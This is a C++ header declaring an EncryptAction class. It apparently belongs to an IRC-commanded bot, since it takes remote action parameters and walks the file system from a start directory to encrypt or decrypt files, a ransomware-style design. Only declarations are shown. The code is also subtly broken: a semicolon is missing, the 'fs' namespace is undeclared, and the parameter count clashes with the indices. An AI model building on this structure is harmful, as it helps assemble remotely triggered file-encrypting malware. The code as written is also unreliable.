#ifndef ENCRYPTACTION_HPP
#define ENCRYPTACTION_HPP

#include <string>
#include <cstdio>
#include <vector>
#include <cstdlib>
#include <filesystem>

#include "Action.hpp"
#include "IrcClient.hpp"
#include "CryptoManager.hpp"
#include "GeneralUtils.hpp"

class EncryptAction : public Action {
public:
    EncryptAction(std::vector<std::string> actionParams, IrcClient* ircClient);

    void execute() override;
    ActionType getActionType() override;

private:
    IrcClient* ircClient
    bool fsEncrypted;
    CryptoManager cryptoManager;
    std::vector<std::string> actionParams;
    bool isValid;
    bool isDecryption;

    const int PARAM_COUNT = 4;
    const int COMMAND_TYPE_IDX = 3;
    const int ALGO_IDX = 4;
    const int START_DIR_IDX = 5;
    const int CRYPTO_TYPE_IDX = 6;

    void checkParams();
    char* determineStartDir(const char* cString);
    void traverseFileSystem(const fs::path& startDir);
};

#endif // ENCRYPTACTION_HPP
